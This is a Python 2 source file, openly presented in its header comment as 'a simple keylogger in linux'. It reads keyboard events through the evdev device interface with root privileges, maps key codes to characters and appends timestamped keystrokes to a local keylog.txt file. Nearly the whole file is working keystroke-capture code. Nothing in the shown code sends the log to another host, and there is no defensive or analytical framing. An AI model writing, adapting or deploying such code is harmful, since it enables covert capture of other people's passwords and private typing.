# -*- coding:utf-8 -*-

# A simple keylogger in linux.
# Using the linux device event,
# so you need the root privilege to read the devices interface.
#
# Author: s0nnet
# Email: s0nnet@sina.com


import re
import sys
import time
from evdev import InputDevice, list_devices
from select import select

lasttime = int(time.time())

def findDevice():
    devs = [InputDevice(fn) for fn in list_devices()]

    for dev in devs:
        if(re.search('eyboard', dev.name)):
            kb_device = dev.fn
            return kb_device
    return False

def ctoa(code):
    dict = {
        1: 'ESC',
        2: '1',
        3: '2',
        4: '3',
        5: '4',
        6: '5',
        7: '6',
        8: '7',
        9: '8',
        10: '9',
        11: '0',
        14: 'backspace',
        15: 'tab',
        16: 'q',
        17: 'w',
        18: 'e',
        19: 'r',
        20: 't',
        21: 'y',
        22: 'u',
        23: 'i',
        24: 'o',
        25: 'p',
        26: '[',
        27: ']',
        28: 'enter',
        29: 'ctrl',
        30: 'a',
        31: 's',
        32: 'd',
        33: 'f',
        34: 'g',
        35: 'h',
        36: 'j',
        37: 'k',
        38: 'l',
        39: ';',
        40: "'",
        41: '`',
        42: 'shift',
        43: '\\',
        44: 'z',
        45: 'x',
        46: 'c',
        47: 'v',
        48: 'b',
        49: 'n',
        50: 'm',
        51: ',',
        52: '.',
        53: '/',
        54: 'shift',
        56: 'alt',
        57: 'space',
        58: 'capslock',
        59: 'F1',
        60: 'F2',
        61: 'F3',
        62: 'F4',
        63: 'F5',
        64: 'F6',
        65: 'F7',
        66: 'F8',
        67: 'F9',
        68: 'F10',
        69: 'numlock',
        70: 'scrollock',
        87: 'F11',
        88: 'F12',
        97: 'ctrl',
        99: 'sys_Rq',
        100: 'alt',
        102: 'home',
        104: 'PageUp',
        105: 'Left',
        106: 'Right',
        107: 'End',
        108: 'Down',
        109: 'PageDown',
        111: 'del',
        125: 'Win',
        126:'Win',
        127: 'compose'
    }
    if code in dict:
        return dict[code]

def writefile(asc):
    global lasttime
    f = open("keylog.txt","a")
    now = int(time.time())
    ntime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(now))
    if abs(now-lasttime) < 5:
        f.write(asc+" ")
    else:
        f.write('\n['+ntime+"] "+asc)
    lasttime = now

    f.close()

def detectInputKey():
    device = findDevice()
    
    if not device:
        print "[-] Can't find any keyboard devices!"
        print "[-] Exit..."
        sys.exit(0)

    dev = InputDevice(device)
    while True:
        select([dev],[],[])
        for event in dev.read():
            if event.value == 1 and event.code != 0:
                asc = ctoa(event.code)
                writefile(asc)
                print asc,
                sys.stdout.flush()
    

if __name__ == "__main__":
    detectInputKey()
